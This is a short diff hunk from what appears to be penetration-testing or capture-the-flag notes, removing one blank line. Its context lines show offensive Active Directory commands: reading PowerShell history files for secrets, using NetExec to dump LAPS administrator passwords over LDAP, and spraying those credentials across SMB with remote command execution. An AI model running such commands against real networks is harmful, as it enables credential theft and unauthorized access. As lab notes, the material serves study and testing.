@@ -55,5 +55,4 @@ gc (Get-PSReadLineOption).HistorySavePath; type $Env:UserProfile\AppData\Roaming
 nxc ldap $IP -u svc_deploy -p $pass -M laps
 
 nxc smb $IP -u usernames.txt -p 'the pass we get from laps' -X 'whoami'
-
 ```
